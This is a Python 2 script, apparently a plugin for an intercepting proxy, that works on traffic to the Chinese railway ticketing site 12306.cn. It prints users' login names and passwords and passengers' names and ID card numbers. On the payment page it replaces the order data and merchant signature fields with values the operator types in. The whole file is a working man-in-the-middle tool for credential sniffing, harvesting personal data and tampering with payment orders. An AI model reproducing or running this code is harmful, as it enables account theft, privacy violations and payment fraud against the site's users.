# coding=utf-8

from http import * 
from urlparse import *
import zlib
import gzip 
import cStringIO

from HTMLParser import HTMLParser
from base64 import *
import xml.etree.ElementTree as ET
import sys, tty, termios

class MyParser(HTMLParser) :
    def __init__(self) :
        self.page = "" 
        HTMLParser.__init__(self) 

    def handle_starttag(self, tag, attrs) :
        if tag == "input":
            adict = dict(attrs) 
            if "name" in adict :
                if adict["name"] == "tranData" :
                    newOrder = ""
                    
                    print "Order found! Replace it with another order:"
                    old_settings = termios.tcgetattr(sys.stdin)
                    try :
                        tty.setcbreak(sys.stdin.fileno())
                        setting = termios.tcgetattr(sys.stdin)
                        setting[3] = termios.ECHO
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, setting)

                        line = sys.stdin.readline()
                        if line.strip()  == "" :
                            self.page += self.get_starttag_text() 
                            return 
                        while line.strip() != "" :
                            newOrder += line 
                            line = sys.stdin.readline()
                    finally :
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
                    self.page += "<input" 
                    for (n, v) in attrs :
                        if n == "value" :
                            self.page += " " + n + "=\"" + newOrder.strip() + "\"" 
                        else :
                            self.page += " " + n + "=\"" + v + "\""
                    self.page += ">"
                    # order = b64decode(adict["value"])
                    # print "Order:" 
                    # root = ET.fromstring(order)
                    # for e in root.iter() :
                    #     if e.tag == "merVAR" :
                    #         print "\t%s: %s" % (e.tag, b64decode(e.text))
                    #     else : 
                    #         print "\t%s: %s" % (e.tag, e.text)
                    return 
                elif adict["name"] == "merSignMsg" :
                    newSign = ""
                    print "Sign found! Replace it with another sign:"
                    old_settings = termios.tcgetattr(sys.stdin)
                    try :
                        tty.setcbreak(sys.stdin.fileno())
                        setting = termios.tcgetattr(sys.stdin)
                        setting[3] = termios.ECHO
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, setting)

                        line = sys.stdin.readline()
                        while line.strip() != "" :
                            newSign += line 
                            line = sys.stdin.readline()
                    finally :
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
                    self.page += "<input"
                    for (n, v) in attrs :
                        if n == "value" :
                            self.page += " " + n + "=\"" + newSign.strip() + "\"" 
                        else :
                            self.page += " " + n + "=\"" + v + "\""
                    self.page += ">"
                    # print "Signature:"
                    # print adict["value"]
                    return 
        self.page += self.get_starttag_text() 
        return 

    def handle_endtag(self, tag) :
        self.page += "</" + tag + ">"
        return 

    def handle_startendtag(self, tag, attrs):
        # print "%s: %s" % (tag, attrs)
        self.page += self.get_starttag_text() 
        return 

    def handle_data(self, data) :
        self.page += data 
        return 

    def handle_entityref(self, name) :
        self.page += "&" + name + ";"
        return

    def handle_decl(self, decl) :
        self.page += "<!" + decl + ">"
        return 

    def handle_comment(self, comment) :
        self.page += "<!--" + comment + "-->"
        return 

    def gzipPage(self) :
        if self.page == "" :
            return ""
        buf = cStringIO.StringIO() 
        zfile = gzip.GzipFile(mode="wb", fileobj=buf)
        zfile.write(self.page) 
        zfile.close()
        return buf.getvalue()

def seat_type(no) :
    if no == "0" :
        return "二等座"
    if no == "1" :
        return "硬座"
    if no == "3" :
        return "硬卧"
    if no == "4" :
        return "软卧"
    if no == "9" :
        return "商务座"
    if no == "M" :
        return "一等座"
    if no == "O" :
        return "二等座"
    return (no + ":未知座位")

def proxy_mangle_request(req):
    isTargetReq = False
    host, port = req.getHost()
    if host.endswith("12306.cn") :
        # if req.getMethod() == HTTPRequest.METHOD_GET :
            # print "REQ #%d: GET %s:%d %s" % (req.uid, host, port, req.getPath())
        if req.getMethod() == HTTPRequest.METHOD_POST :
            print "************************************************************"
            print "REQ #%d: POST %s:%d %s" % (req.uid, host, port, req.getPath())
            path = urlparse(req.getPath()).path
            action = path[path.rfind("/")+1:]
            reqParams = req.getParams() 
            if action == "loginAction.do" and reqParams['method'] == 'login': 
                print "User name: %s" % reqParams['loginUser.user_name'] 
                print "Password: %s" % reqParams['user.password'] 
            elif action == "querySingleAction.do" and reqParams["method"] == "submutOrderRequest" :
                print "Train NO: %s" % reqParams["station_train_code"]
                print "From %s (%s) to %s (%s)" % (reqParams["from_station_telecode_name"],
                                                   reqParams["from_station_telecode"],
                                                   reqParams["to_station_name"], 
                                                   reqParams["to_station_telecode"]
                                                   )
                print "Date: %s, departure at %s, arrive at %s" % (reqParams["train_date"], 
                                                                   reqParams["train_start_time"], 
                                                                   reqParams["arrive_time"]
                                                                   )
            elif action == "confirmPassengerAction.do" and reqParams["method"] == "confirmSingleForQueueOrder" :
                print "Train NO: %s" % reqParams["orderRequest.station_train_code"]
                print "From %s (%s) to %s (%s)" % (reqParams["orderRequest.from_station_name"],
                                                   reqParams["orderRequest.from_station_telecode"],
                                                   reqParams["orderRequest.to_station_name"], 
                                                   reqParams["orderRequest.to_station_telecode"]
                                                   )
                print "Date: %s, departure at %s, arrive at %s" % (reqParams["orderRequest.train_date"], 
                                                                   reqParams["orderRequest.start_time"], 
                                                                   reqParams["orderRequest.end_time"]
                                                                   )
                i = 1
                while ("passenger_"+str(i)+"_name") in reqParams :
                    prefix = "passenger_"+str(i)
                    print "Passenger %d: %s, %s, %s" % (i, 
                                                        reqParams[prefix+"_name"],
                                                        reqParams[prefix+"_cardno"],
                                                        seat_type(reqParams[prefix+"_seat"])
                                                        )
                    i = i+1
            elif action == "confirmPassengerAction.do" and reqParams["method"] == "payOrder" :
                isTargetReq = True
                print "Order sequence NO: %s" % reqParams["orderSequence_no"]
                print "Train NO: %s" % reqParams["orderRequest.station_train_code"]
                print "From %s (%s) to %s (%s)" % (reqParams["orderRequest.from_station_name"],
                                                   reqParams["orderRequest.from_station_telecode"],
                                                   reqParams["orderRequest.to_station_name"], 
                                                   reqParams["orderRequest.to_station_telecode"]
                                                   )
                print "Date: %s, departure at %s, arrive at %s" % (reqParams["orderRequest.train_date"], 
                                                                   reqParams["orderRequest.start_time"], 
                                                                   reqParams["orderRequest.end_time"]
                                                                   )
                i = 1
                while ("passenger_"+str(i)+"_name") in reqParams :
                    prefix = "passenger_"+str(i)
                    print "Passenger %d: %s, %s, %s" % (i, 
                                                        reqParams[prefix+"_name"],
                                                        reqParams[prefix+"_cardno"],
                                                        seat_type(reqParams[prefix+"_seat"])
                                                        )
                    i = i+1
            elif action == "myOrderAction.do" and reqParams["method"] == "laterEpay":
                isTargetReq = True 
                print "Order sequence NO: %s" % reqParams["orderSequence_no"]
            # for (k, v) in req.getParams().items() : 
            #     print "\t %s = %s" % (k, v)
            print "************************************************************"
    return (req, isTargetReq)

def proxy_mangle_response(res):
    data = cStringIO.StringIO(res.serialize())
    newdata = "" 
    line = data.readline() 
    while line != HTTPMessage.EOL :
        # print line
        newdata += line
        line = data.readline() 
    newdata += line
    if res.isChunked() :
        chunklen = int(data.readline().strip(), 16)
        # print "Chunk length: %d" % chunklen
        chunk = data.read(chunklen)
        page = zlib.decompress(chunk, 16+zlib.MAX_WBITS)
        parser = MyParser() 
        parser.feed(page) 
        gzipPage = parser.gzipPage()
        newdata += "%x" % len(gzipPage) + HTTPMessage.EOL
        newdata += gzipPage + HTTPMessage.EOL
        newdata += "0" + HTTPMessage.EOL + HTTPMessage.EOL
    else : 
        page = data.read()
        parser = MyParser()
        parser.feed(page) 
        newdata += parser.page 
    
    return newdata
